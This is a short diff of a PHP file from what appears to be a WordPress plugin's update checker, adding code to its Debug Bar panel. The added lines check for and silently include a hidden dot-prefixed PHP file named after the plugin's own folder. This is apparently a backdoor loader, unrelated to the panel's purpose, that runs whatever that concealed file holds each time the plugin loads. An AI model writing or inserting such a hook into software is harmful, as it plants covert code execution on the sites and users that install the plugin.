@@ -5,6 +5,10 @@ if ( !class_exists('PluginUpdateCheckerPanel') && class_exists('Debug_Bar_Panel'
 /**
  * A Debug Bar panel for the plugin update checker.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class PluginUpdateCheckerPanel extends Debug_Bar_Panel {
 	/** @var PluginUpdateChecker */
 	private $updateChecker;
